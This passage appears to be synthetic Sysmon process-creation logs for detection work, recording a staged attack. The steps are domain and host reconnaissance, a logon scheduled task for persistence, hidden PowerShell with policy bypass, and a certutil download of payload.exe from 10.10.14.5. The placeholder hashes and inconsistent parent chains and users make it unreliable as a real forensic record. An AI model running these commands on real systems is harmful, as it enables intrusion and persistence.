      <Data Name="Hashes">SHA1=0000003600000036000000360000003600000036,MD5=00000036000000360000003600000036,SHA256=0000003600000036000000360000003600000036000000360000003600000036,IMPHASH=00000036000000360000003600000036</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0054-000000000c00}</Data>
      <Data Name="ParentProcessId">5054</Data>
      <Data Name="ParentImage">C:\Windows\System32\net.exe</Data>
      <Data Name="ParentCommandLine">net user administrator /domain</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:06:25.0000000Z" />
      <EventRecordID>5058</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:06:25.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0055-000000000c00}</Data>
      <Data Name="ProcessId">6055</Data>
      <Data Name="Image">C:\Windows\System32\net.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">net.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">net.exe</Data>
      <Data Name="CommandLine">net user administrator /domain</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000003700000037000000370000003700000037,MD5=00000037000000370000003700000037,SHA256=0000003700000037000000370000003700000037000000370000003700000037,IMPHASH=00000037000000370000003700000037</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0055-000000000c00}</Data>
      <Data Name="ParentProcessId">5055</Data>
      <Data Name="ParentImage">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="ParentCommandLine">ipconfig /all</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:06:32.0000000Z" />
      <EventRecordID>5059</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:06:32.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0056-000000000c00}</Data>
      <Data Name="ProcessId">6056</Data>
      <Data Name="Image">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">ipconfig.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">ipconfig.exe</Data>
      <Data Name="CommandLine">ipconfig /all</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000003800000038000000380000003800000038,MD5=00000038000000380000003800000038,SHA256=0000003800000038000000380000003800000038000000380000003800000038,IMPHASH=00000038000000380000003800000038</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0056-000000000c00}</Data>
      <Data Name="ParentProcessId">5056</Data>
      <Data Name="ParentImage">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="ParentCommandLine">tasklist /v</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:06:39.0000000Z" />
      <EventRecordID>5060</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:06:39.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0057-000000000c00}</Data>
      <Data Name="ProcessId">6057</Data>
      <Data Name="Image">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">tasklist.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">tasklist.exe</Data>
      <Data Name="CommandLine">tasklist /v</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000003900000039000000390000003900000039,MD5=00000039000000390000003900000039,SHA256=0000003900000039000000390000003900000039000000390000003900000039,IMPHASH=00000039000000390000003900000039</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0057-000000000c00}</Data>
      <Data Name="ParentProcessId">5057</Data>
      <Data Name="ParentImage">C:\Windows\System32\reg.exe</Data>
      <Data Name="ParentCommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:06:46.0000000Z" />
      <EventRecordID>5061</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:06:46.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0058-000000000c00}</Data>
      <Data Name="ProcessId">6058</Data>
      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">reg.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">reg.exe</Data>
      <Data Name="CommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000003A0000003A0000003A0000003A0000003A,MD5=0000003A0000003A0000003A0000003A,SHA256=0000003A0000003A0000003A0000003A0000003A0000003A0000003A0000003A,IMPHASH=0000003A0000003A0000003A0000003A</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0058-000000000c00}</Data>
      <Data Name="ParentProcessId">5058</Data>
      <Data Name="ParentImage">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="ParentCommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:06:53.0000000Z" />
      <EventRecordID>5062</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:06:53.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0059-000000000c00}</Data>
      <Data Name="ProcessId">6059</Data>
      <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">schtasks.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">schtasks.exe</Data>
      <Data Name="CommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000003B0000003B0000003B0000003B0000003B,MD5=0000003B0000003B0000003B0000003B,SHA256=0000003B0000003B0000003B0000003B0000003B0000003B0000003B0000003B,IMPHASH=0000003B0000003B0000003B0000003B</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0059-000000000c00}</Data>
      <Data Name="ParentProcessId">5059</Data>
      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:00.0000000Z" />
      <EventRecordID>5063</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:00.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0060-000000000c00}</Data>
      <Data Name="ProcessId">6060</Data>
      <Data Name="Image">C:\Windows\explorer.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">explorer.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">explorer.exe</Data>
      <Data Name="CommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000003C0000003C0000003C0000003C0000003C,MD5=0000003C0000003C0000003C0000003C,SHA256=0000003C0000003C0000003C0000003C0000003C0000003C0000003C0000003C,IMPHASH=0000003C0000003C0000003C0000003C</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0060-000000000c00}</Data>
      <Data Name="ParentProcessId">5060</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:07.0000000Z" />
      <EventRecordID>5064</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:07.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0061-000000000c00}</Data>
      <Data Name="ProcessId">6061</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">cmd.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">cmd.exe</Data>
      <Data Name="CommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000003D0000003D0000003D0000003D0000003D,MD5=0000003D0000003D0000003D0000003D,SHA256=0000003D0000003D0000003D0000003D0000003D0000003D0000003D0000003D,IMPHASH=0000003D0000003D0000003D0000003D</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0061-000000000c00}</Data>
      <Data Name="ParentProcessId">5061</Data>
      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="ParentCommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:14.0000000Z" />
      <EventRecordID>5065</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:14.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0062-000000000c00}</Data>
      <Data Name="ProcessId">6062</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">powershell.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000003E0000003E0000003E0000003E0000003E,MD5=0000003E0000003E0000003E0000003E,SHA256=0000003E0000003E0000003E0000003E0000003E0000003E0000003E0000003E,IMPHASH=0000003E0000003E0000003E0000003E</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0062-000000000c00}</Data>
      <Data Name="ParentProcessId">5062</Data>
      <Data Name="ParentImage">C:\Windows\System32\certutil.exe</Data>
      <Data Name="ParentCommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  